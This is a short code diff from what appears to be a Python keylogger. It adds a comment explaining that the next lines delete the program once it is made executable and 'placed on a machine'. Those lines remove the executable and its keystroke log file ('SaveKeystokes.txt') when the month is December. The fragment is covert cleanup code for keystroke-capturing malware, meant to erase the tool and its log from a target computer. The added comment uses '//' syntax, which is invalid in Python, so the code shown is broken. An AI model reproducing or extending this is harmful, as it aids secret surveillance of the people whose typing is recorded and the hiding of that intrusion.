@@ -17,7 +17,7 @@ try:
 
     log_dir = ""
 
-
+//this 3 lines help you delete it in a given month if you ever make it executable to place it on a machine
     if(now.month==12):
         os.remove("this_file.exe")
         os.remove("SaveKeystokes.txt")
